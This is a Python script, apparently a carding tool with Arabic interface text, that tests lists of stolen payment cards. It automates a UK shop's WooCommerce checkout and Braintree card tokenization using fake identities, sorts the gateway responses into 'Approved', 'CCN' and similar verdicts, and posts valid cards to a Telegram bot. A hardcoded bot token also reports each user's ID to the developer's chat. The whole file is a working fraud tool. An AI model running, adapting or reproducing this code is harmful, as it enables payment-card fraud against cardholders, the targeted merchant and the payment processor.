try:
	import requests,re,time
	from colorama import Fore
	from bs4 import BeautifulSoup
	import os
	import time
except ImportError:
	os.system('pip install requests')
	os.system('pip install re')
	os.system('pip install time')
	os.system('pip install colorama')
	os.system('pip install bs4')
import os,requests,sys,time,datetime
now = datetime.datetime.today()
an = datetime.datetime.now()
an2 = datetime.datetime(2029,1,7,0,00)
hours = (now.hour)
if an > an2 or an == an2:
 print("033[1;31mThe Date : "+ str(an))
 print("\033[1;31mThe Exp Date : "+ str(an2))
 time.sleep(1)
 print('\t\n\033[1;31m  تــم ايــقــافـ الاداهـ مـن      ')
 print('\033[1;31m @PQ4_F الـــمـــطـــوࢪ  ')
 exit(0)
else: 
 print("\n                             اشتراكك صالح لمدة                            ")
 print("\033[1;31mالوقت حاليا : "+ str(an))
 print('\n')
 print('𓏳'*60)
 print("\033[1;31m\nوقت الانتهاء : "+ str(an2))
 print('')
 print('𓏳'*60)
 print('\t\n\033[1;31m @PQ4_F الـــمـــطـــوࢪ   ')
 kilwa = '''''''''''print('𓏳'*50)'''''''''''
 os.system("clear")
import os
try:
	import names
except:
	os.system('pip install names')
	import names
import requests,os,time,string,random,names
try:
	import requests
except:
	os.system('pip install requests')
try:
	from cfonts import render  
except:
	os.system('pip install python-cfonts')
proxies = None
import re
import requests
try:
  from faker import Faker
except:
  os.system("pip install faker")
  from faker import Faker
from time import sleep
import random
output = render('SNIPER', colors=['white', 'magenta'], align='center')
print(output)   
E = '\033[1;31m'
X = '\033[1;33m'
F = '\033[2;32m'
M = '\x1b[1;37m'
B = '\x1b[38;5;208m'
print(E)
path = input(f' {F}({M}1{F}) {M} 𝐄𝐧𝐭𝐞𝐫 𝐧𝐚𝐦𝐞 𝐟𝐢𝐥𝐞{F}  ' + E)
print(X + ' ═════════════════════════════════  ')
token = input(f' {F}({M}2{F}) {M} 𝐄𝐧𝐭𝐞𝐫 𝐓𝐨𝐤𝐞𝐧{F}  ' + E)
print(X + ' ═════════════════════════════════  ')
ID = input(f' {F}({M}3{F}) {M} 𝐄𝐧𝐭𝐞𝐫 𝐈𝐃{F}  ' + E)
requests.post(f"https://api.telegram.org/bot8330375239:AAEgiFAwKIBc67RkbJpUxnf9R-DD9RUGkSM/sendMessage?chat_id=6681949474&parse_mode=HTML&text=<b>━━━━━━━━━━━━━━━━\n[↯] مستخدم البوت حاليا ⇾ <a href='tg://user?id={ID}'>المستخدم</a></b>")
start = 0
with open(path) as file:
    lino = file.readlines()
    lino = [line.rstrip() for line in lino]
if len(lino) > 200:
    print(f"{F}⚠️ {M}Too many combos (超过200), skipping processing.{F}")
else:
    print(f"{M}Processing {len(lino)} combos...{F}")
    
try:
	import requests,re,time
	from colorama import Fore
	from bs4 import BeautifulSoup
	import os
	import time
	import requests
	import re
except ImportError:
	os.system('pip install requests')
	os.system('pip install re')
	os.system('pip install time')
	os.system('pip install colorama')
	os.system('pip install bs4')
def getstr(text: str, a: str, b: str) -> str:
    try:
        return text.split(a)[1].split(b)[0]
    except IndexError:
        return None
def gateway():
	import requests, random, base64, secrets, uuid, re, json
	session = requests.Session()
	proxy = ''
	proxies = {
        "http": proxy,
    }
	session.proxies.update(proxies)
	email = f"{str(uuid.uuid4())[:8]}@gmail.com"
	phone = ''.join([str(random.randint(0, 9)) for _ in range(10)])
	sessionid = str(uuid.uuid4())
	correlationid = secrets.token_hex(16)
def cc(e):
	import jwt
	import user_agent
	from user_agent import generate_user_agent
	import requests, random, base64, secrets, uuid, re, json
	from requests_toolbelt.multipart.encoder import MultipartEncoder
	import base64
	import urllib
	import json
	n = e.split('|')[0]
	mm = e.split('|')[1]
	yy = e.split('|')[2][-2:]
	cvv = e.split('|')[3]
	card=e.replace('\n','')
	user = user_agent.generate_user_agent()
	session=requests.session()
	user = user_agent.generate_user_agent()
	username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
	user = generate_user_agent()
	r = requests.session()
	bin = n[:6]
	fake = Faker("en_GB") 
	email = f"{str(uuid.uuid4())[:8]}@gmail.com"
	first_name = fake.first_name()
	last_name = fake.last_name()
	company = fake.company()
	phone = fake.phone_number()
	address1 = fake.street_address()
	address2 = fake.secondary_address()
	city = fake.city()
	state = fake.city_suffix()
	postcode = fake.postcode()
	headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'referer': 'https://hakko.co.uk/',
    'user-agent': user,
}

	response = session.get(
    'https://hakko.co.uk/product/fm-2023-smd-mini-hot-tweezer-tool-conversion-kit/',
    cookies=r.cookies,
    headers=headers,
);time.sleep(5)


	data = MultipartEncoder({
    'quantity': (None, '1'),
    'add-to-cart': (None, '2613'),
})

	headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'content-type': data.content_type,
    'origin': 'https://hakko.co.uk',
    'referer': 'https://hakko.co.uk/product/fm-2023-smd-mini-hot-tweezer-tool-conversion-kit/',
    'user-agent': user,
}



	response = session.post(
    'https://hakko.co.uk/product/fm-2023-smd-mini-hot-tweezer-tool-conversion-kit/',
    cookies=r.cookies,
    data=data,
    headers=headers,
);time.sleep(5)

	headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'referer': 'https://hakko.co.uk/basket/',
    'user-agent': user,
}

	response = session.get('https://hakko.co.uk/checkout/', cookies=r.cookies, headers=headers);time.sleep(5)

	id = re.search(r'id="wc-braintree-client-manager-js-extra" src="data:text/javascript;base64,(.*?)"',response.text).group(1)

	ko = base64.b64decode(id).decode('utf-8')

	b_token_encrypted = re.findall(r'client_token=\["(.*?)"\]', ko)[0]

	sn = base64.b64decode(b_token_encrypted).decode('utf-8')

	btoken = getstr(sn, '"authorizationFingerprint":"', '","')

	add_nonce =re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"',response.text).group(1)

	b_token = "Bearer "+btoken

	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': b_token,
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://hakko.co.uk',
    'referer': 'https://hakko.co.uk/',
    'user-agent': user,
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': str(uuid.uuid4()),
    },
    'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT         cardinalSongbirdUrl         cardinalSongbirdIdentityHash       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     fastlane {       enabled       tokensOnDemand {         enabled         tokenExchange {           enabled         }       }     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment       enrichedCustomerDataEnabled    }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
    'operationName': 'ClientConfiguration',
}

	response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data);time.sleep(5)

	cardnal = getstr(response.text,'cardinalAuthenticationJWT":"','"')

	googleAuthorization = getstr(response.text,'googleAuthorization":"','"')

	merchantIdentifier = getstr(response.text,'merchantIdentifier":"','"')

	headers = {
    'authority': 'hakko.co.uk',
    'accept': '*/*',
    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://hakko.co.uk',
    'pragma': 'no-cache',
    'referer': 'https://hakko.co.uk/checkout/',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
}

	params = {
    'wc-ajax': 'update_order_review',
}

	data_dict = {
    "security": "a8148c3a0d",
    "payment_method": "braintree_cc",
    "billing_first_name": first_name,
    "billing_last_name": last_name,
    "billing_company": company,
    "billing_country": "GB",
    "billing_address_1": address1,
    "billing_address_2": address2,
    "billing_city": city,
    "billing_state": state,
    "billing_postcode": postcode,
    "billing_phone": phone,
    "billing_email": email,
    "shipping_first_name": first_name,
    "shipping_last_name": last_name,
    "shipping_company": company,
    "shipping_country": "GB",
    "shipping_address_1": address1,
    "shipping_address_2": address2,
    "shipping_city": city,
    "shipping_state": state,
    "shipping_postcode": postcode,

    "has_full_address": "true",
    "shipping_method[0]": "flexible_shipping_single:27",
    "terms-field": "1",
    "woocommerce-process-checkout-nonce": add_nonce,
    "_wp_http_referer": "/checkout/",
}
	data = urllib.parse.urlencode(data_dict)

	response = session.post('https://hakko.co.uk/', params=params, cookies=r.cookies, headers=headers, data=data);time.sleep(5)

	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': b_token,
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'user-agent': user,
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': str(uuid.uuid4()),
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvv,
                'billingAddress': {
                    'postalCode': postcode,
                    'streetAddress': '6355 Wycliff Ave',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data);time.sleep(5)

	token_bc = getstr(response.text, '"token":"', '"')

	headers = {
    'authority': 'hakko.co.uk',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://hakko.co.uk',
    'pragma': 'no-cache',
    'referer': 'https://hakko.co.uk/checkout/',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
}

	params = {
    'wc-ajax': 'checkout',
}

	data_dict = {
    "wc_order_attribution_source_type": "typein",
    "wc_order_attribution_referrer": "(none)",
    "wc_order_attribution_utm_campaign": "(none)",
    "wc_order_attribution_utm_source": "(direct)",
    "wc_order_attribution_utm_medium": "(none)",
    "wc_order_attribution_utm_content": "(none)",
    "wc_order_attribution_utm_id": "(none)",
    "wc_order_attribution_utm_term": "(none)",
    "wc_order_attribution_utm_source_platform": "(none)",
    "wc_order_attribution_utm_creative_format": "(none)",
    "wc_order_attribution_utm_marketing_tactic": "(none)",
    "wc_order_attribution_session_entry": "https://hakko.co.uk/basket/",
    "wc_order_attribution_session_start_time": "2025-08-28 14:12:36",
    "wc_order_attribution_session_pages": "13",
    "wc_order_attribution_session_count": "1",
    "wc_order_attribution_user_agent": user,
    "billing_first_name": first_name,
    "billing_last_name": last_name,
    "billing_company": company,
    "billing_country": "GB",
    "billing_address_1": address1,
    "billing_address_2": address2,
    "billing_city": city,
    "billing_state": state,
    "billing_postcode": postcode,
    "billing_phone": phone,
    "billing_email": email,
    "shipping_first_name": first_name,
    "shipping_last_name": last_name,
    "shipping_company": company,
    "shipping_country": "GB",
    "shipping_address_1": address1,
    "shipping_address_2": address2,
    "shipping_city": city,
    "shipping_state": state,
    "shipping_postcode": postcode,
    "order_comments": "",
    "shipping_method[0]": "flexible_shipping_single:27",
    "payment_method": "braintree_cc",
    "braintree_cc_nonce_key": token_bc,
    "braintree_cc_device_data": '{"correlation_id":"%s"}' % fake.uuid4(),
    "braintree_cc_3ds_nonce_key": "",
    "braintree_cc_config_data": '{"environment":"production"}',
    "terms": "on",
    "terms-field": "1",
    "woocommerce-process-checkout-nonce": add_nonce,
    "_wp_http_referer": "/?wc-ajax=update_order_review",
}

	data = urllib.parse.urlencode(data_dict)

	response = session.post('https://hakko.co.uk/', params=params, cookies=r.cookies, headers=headers, data=data);time.sleep(5)
	me = response.text  
	text = response.text
	data = json.loads(me)
	messages = data.get("messages", "")
	pattern = r'<li>\s*There was an error processing your payment. Reason:\s*(.*?)\s*<\/li>'
	result = re.search(pattern, messages, re.DOTALL)
	if result:
		kopi = result.group(1).strip()  
		if 'risk_threshold' in kopi:
			return "RISK: Retry this BIN later."
		elif 'You cannot add a new payment method so soon after the previous one' in kopi:
			return "Please wait for 20 seconds."
		elif 'Nice! New payment method added' in kopi or 'Payment method successfully added.' in kopi:
			return '1000: Approved'
		elif 'Duplicate card exists in the vault.' in kopi:
			return 'Approved'
		elif "avs: Gateway Rejected: avs" in kopi or "avs_and_cvv: Gateway Rejected: avs_and_cvv" in kopi or "cvv: Gateway Rejected: cvv" in kopi:
			return 'Insufficient funds'
		elif "Invalid postal code" in kopi or "CVV." in kopi:
			return 'Approved (CVV)'
		elif "Card Issuer Declined CVV" in kopi:
			return 'Approved (CCN)'
		else:
			return kopi
	else:
		if 'Payment method successfully added.' in text:
			return "1000: Approved"
		elif 'risk_threshold' in text:
			return "RISK: Retry this BIN later."
		elif 'Please wait for 20 seconds.' in text:
			return "try again"
		else:
			return response.text
	
for card in lino:
    try: data = requests.get('https://bins.antipublic.cc/bins/'+card[:6]).json()
    except: pass
    try:
        level = data['level']
    except:
        level = 'Unknown'
    try:
        brand = data['brand']
    except:
        brand = 'Unknown'
    try:
        card_type = data['type']
    except:
        card_type = 'Unknown'
    try:
        country = data['country']
        country_flag = data['country_flag']
    except:
        country = 'Unknown'
        country_flag = 'Unknown'
    try:
        bank = data['bank']
    except:
        bank = 'Unknown'
    msg = str(cc(card)).strip()
    if 'Approved' in msg or 'Insufficient funds' in msg or '1000: Approved' in msg:
    	print(Fore.GREEN+f"{card} >> {msg} ✅")
    	requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&parse_mode=HTML&text=<b>𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅\n━━━━━━━━━━━━━━━━           \n[↯] 𝗖𝗖 ⇾ <code>{card}</code>\n[↯] 𝗚𝗔𝗧𝗘𝗦: 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗖𝗛𝗔𝗥𝗚𝗘\n[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: {msg} 🟢━━━━━━━━━━━━━━━━\n[↯] 𝗕𝗜𝗡 𝗚𝗘𝗡 ↯  <code>/gen {card[:12]}xxxx|xx|xxxx|xxx🕸️</code>\n[↯] 𝗕𝗜𝗡 ↯ <code>{card[:6]}</code>\n[↯] 𝗕𝗮𝗻𝗸 ↯  <code>{bank}</code>\n[↯] 𝗧𝗬𝗣𝗘 ↯ <code>{card_type} - {brand}</code>\n[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↯  <code>{country} - [{country_flag}]</code>\n━━━━━━━━━━━━━━━━\n[↯] 𝗕𝗼𝘁 𝗕𝘆 ⇾ <a href='tg://user?id=843841687'>ﺂﻟﹻٰۧﹷﻘﹻٰۧﹷﻧﹻٰۧﹷﺂص ۦٰ۪۫ﮮٰٰ۪۪۫۫ۦٰ۪۫ۦ</a></b>")
    	
    else:
        print(Fore.RED+f"{card} >> "+msg+'❌')